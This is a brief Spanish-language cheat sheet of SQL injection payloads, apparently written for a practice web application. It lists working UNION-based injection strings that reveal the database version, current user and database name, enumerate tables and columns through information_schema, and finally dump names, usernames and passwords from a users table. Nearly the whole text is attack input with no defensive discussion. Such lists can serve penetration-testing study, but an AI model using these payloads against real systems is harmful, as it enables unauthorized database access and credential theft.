# Vulnerability: SQL injection
### Obtener el nombre de usuario y versión de base de datos
%' or 0=0 union select null, version() # 
###  Obtener el usuario logeado 
- %' union select null, user() #
- %' union select user(), version() #
### Obtener la base de datos
- %' union select null, database() #
### Obtener las tablas
- %' union select null, table_name from information_schema.tables #
- %' union select null, table_name from information_schema.tables where table_name like 'user%'#
- %' union select null, concat(table_name,0x0a ,column_name) from information_schema.columns where table_name = 'users'#
- %' union select null, concat(first_name,0x0a ,last_name,0x0a ,user,0x0a ,password) from users#
